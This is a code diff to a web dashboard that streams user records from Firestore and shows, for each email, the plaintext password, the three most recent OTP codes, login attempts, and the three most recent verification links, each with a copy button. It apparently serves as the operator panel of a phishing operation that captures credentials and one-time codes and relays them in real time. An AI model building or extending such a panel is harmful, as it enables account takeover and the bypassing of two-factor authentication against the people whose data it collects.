@@ -244,13 +244,21 @@ placeholder="Search email..."
 
 <th>Password</th>
 
-<th>OTP</th>
+<th>OTP 1</th>
+
+<th>OTP 2</th>
+
+<th>OTP 3</th>
 
 <th>Attempts</th>
 
 <th>Login Status</th>
 
-<th>Verification Link</th>
+<th>Link 1</th>
+
+<th>Link 2</th>
+
+<th>Link 3</th>
 
 <th>Verification Status</th>
 
@@ -300,6 +308,21 @@ Login, OTP or Verification changes.
 */
 
 const customers = {};
+function initCustomer(email){
+
+    if(!customers[email]){
+
+        customers[email]={
+
+            otps:[],
+
+            links:[]
+
+        };
+
+    }
+
+}
 document.addEventListener("click", async (e)=>{
 
     const td=e.target.closest(".copy-cell");
@@ -373,9 +396,16 @@ data-copy="${c.password||""}">
 ${c.password||""}
 </td>
 
-<td class="copy-cell"
-data-copy="${c.otp||""}">
-${c.otp||"-"}
+<td class="copy-cell" data-copy="${c.otps?.[0]||''}">
+${c.otps?.[0]||"-"}
+</td>
+
+<td class="copy-cell" data-copy="${c.otps?.[1]||''}">
+${c.otps?.[1]||"-"}
+</td>
+
+<td class="copy-cell" data-copy="${c.otps?.[2]||''}">
+${c.otps?.[2]||"-"}
 </td>
 
 <td>
@@ -392,13 +422,16 @@ ${c.status||"Pending"}
 
 </td>
 
-<td class="copy-cell"
-data-copy="${c.link||""}">
+<td class="copy-cell" data-copy="${c.links?.[0]||''}">
+${c.links?.[0] ? "📋 Copy" : "-"}
+</td>
 
-${c.link
-? "Copy Link"
-: "-"}
+<td class="copy-cell" data-copy="${c.links?.[1]||''}">
+${c.links?.[1] ? "📋 Copy" : "-"}
+</td>
 
+<td class="copy-cell" data-copy="${c.links?.[2]||''}">
+${c.links?.[2] ? "📋 Copy" : "-"}
 </td>
 
 <td>
@@ -471,7 +504,7 @@ onSnapshot(
 
             const email = (data.email || "").toLowerCase();
 
-            if (!customers[email]) customers[email] = {};
+            initCustomer(email);
 
             customers[email].loginId = loginDoc.id;
             customers[email].email = data.email || "";
@@ -509,10 +542,20 @@ onSnapshot(
 
             const email = (data.email || "").toLowerCase();
 
-            if (!customers[email]) customers[email] = {};
+            initCustomer(email);
 
-            customers[email].otp = data.otp || "";
-            customers[email].attempt = data.attempt || 1;
+const otp=data.otp||"";
+
+if(otp){
+
+    customers[email].otps.unshift(otp);
+
+    customers[email].otps =
+        customers[email].otps.slice(0,3);
+
+}
+
+customers[email].attempt=data.attempt||1;
 
             if (data.createdAt &&
                 (!customers[email].time ||
@@ -548,13 +591,22 @@ onSnapshot(
 
             const email = (data.email || "").toLowerCase();
 
-            if (!customers[email]) customers[email] = {};
+            initCustomer(email);
 
-            customers[email].link =
-                data.verificationLink || "";
+const link=data.verificationLink||"";
 
-            customers[email].verifyStatus =
-                data.status || "Pending";
+if(link){
+
+    customers[email].links.unshift(link);
+
+    customers[email].links =
+        customers[email].links.slice(0,3);
+
+}
+
+customers[email].verifyStatus=
+
+data.status||"Pending";
 
             if (data.createdAt &&
                 (!customers[email].time ||
